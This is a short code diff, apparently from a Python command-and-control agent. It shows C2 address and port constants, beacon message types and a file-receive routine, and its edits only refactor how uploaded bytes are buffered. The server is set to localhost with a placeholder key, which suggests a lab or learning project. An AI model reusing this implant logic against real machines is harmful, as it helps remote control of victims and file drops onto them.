@@ -15,7 +15,7 @@ HEADER_SIZE = struct.calcsize(HEADER_FORMAT) 	# CALCULATES AND RETURNS HEADER_SI
 C2_IP = '127.0.0.1'								
 C2_PORT = 1346
 KEY = 'placeholder'
-seq = 404    # PLACEHOLDER FOR NOW
+seq = 404
 
 # PROTOCOL MESSAGE TYPES
 MT_BEACON 	= 0
@@ -139,12 +139,12 @@ def recv_file(s, packet) -> bool:
 
         send_data(s, MT_UP, seq, b'')                           # SIGNAL C2 TO START UPLOAD WITH MT_UP OK PACKET
 
-        file_bytes = b''                                        # DECLARE NEW BYTES OBJECT
+        file_bytes = bytearray()                                # DECLARE BYTEARRAY FOR APPENDING
         file_bytes_recv = 0                                     # RECEIVES AND COLLECTS LENGTH OF UPLOADED BYTES
         while file_bytes_recv < file_size:                      # WHILE LOOP TO KEEP RECEIVING BYTES UNTIL RECEIVED BYTES == EXPECTED FILE SIZE
             response = recv_packet(s)
             if response[0] == MT_DATA:
-                file_bytes += response[4]
+                file_bytes.extend(response[4])
                 file_bytes_recv += len(response[4])
             
             else:
